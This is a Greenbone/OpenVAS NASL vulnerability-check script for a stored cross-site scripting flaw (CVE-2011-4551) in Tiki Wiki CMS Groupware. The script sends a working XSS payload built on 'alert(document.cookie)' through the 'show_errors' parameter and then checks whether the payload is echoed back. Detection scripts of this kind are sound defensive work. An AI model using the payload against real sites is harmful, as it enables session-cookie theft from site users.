# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:tiki:tikiwiki_cms/groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902651");
  script_version("2022-04-28T13:38:57+0000");
  script_cve_id("CVE-2011-4551");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-12-21 15:59:55 +0530 (Wed, 21 Dec 2011)");
  script_name("Tiki Wiki CMS Groupware 'show_errors' Parameter Stored Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TikiWiki/installed");

  script_xref(name:"URL", value:"http://info.tiki.org/tiki-view_articles.php?topic=1");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51128");
  script_xref(name:"URL", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/51128.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108036/INFOSERVE-ADV2011-07.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");
  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware versions prior to 8.2 and 6.5 LTS.");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input to
  'show_errors' parameter in 'tiki-cookie-jar.php', 'tiki-login.php' and
  'tiki-remind_password.php' script, which allows attackers to conduct stored
   xss by sending a crafted request with JavaScript.");
  script_tag(name:"solution", value:"Upgrade Tiki Wiki CMS Groupware to 8.2 or 6.5 LTS or later.");
  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to stored cross site scripting vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

host = http_host_name( port:port );

url1 = dir + "/tiki-cookie-jar.php?show_errors=y&xss=%3C/style%3E%3C/script" +
             "%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E";

req = string( "GET ", url1, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Accept-Encoding: gzip,deflate\r\n",
              "Connection: keep-alive\r\n\r\n" );
res = http_keepalive_send_recv( port:port, data:req );

url2 = dir + "/tiki-index.php";
req = string( "GET ", url2, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Cookie: runs_before_js_detect=2; javascript_enabled=y;" +
              " PHPSESSID=5181826cedb8dff2c347206640573492\r\n\r\n" );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( res =~ "^HTTP/1\.[01] 200" && "show_errors: 'y'" >< res &&
   "</style></script><script>alert(document.cookie)</script>" >< res ) {
  report = http_report_vuln_url( port:port, url:url2 );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
